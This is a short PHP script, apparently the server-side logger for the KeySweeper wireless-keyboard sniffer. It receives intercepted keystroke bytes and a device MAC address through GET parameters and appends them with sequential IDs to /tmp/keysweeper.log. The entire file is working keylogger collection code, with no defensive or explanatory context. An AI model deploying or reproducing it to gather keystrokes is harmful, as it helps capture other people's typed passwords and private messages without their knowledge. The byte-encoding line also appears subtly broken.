<?php

$file = "/tmp/keysweeper.log";

$lastid = 0;
$fh = fopen($file, "r") or die("Can't read log file");
while (($line = fgets($fh)) !== false)
{
	$a = explode(" ", $line);
	$lastid = $a[0];
}
fclose($fh);

$lastid++;

$hex = unpack('H2', @$_GET["c"]);
$mac = @$_GET["mac"];
if (!$mac) $mac = "n/a";
file_put_contents($file, "$lastid $hex[0]$hex[1] $mac\n", FILE_APPEND | LOCK_EX);

?>
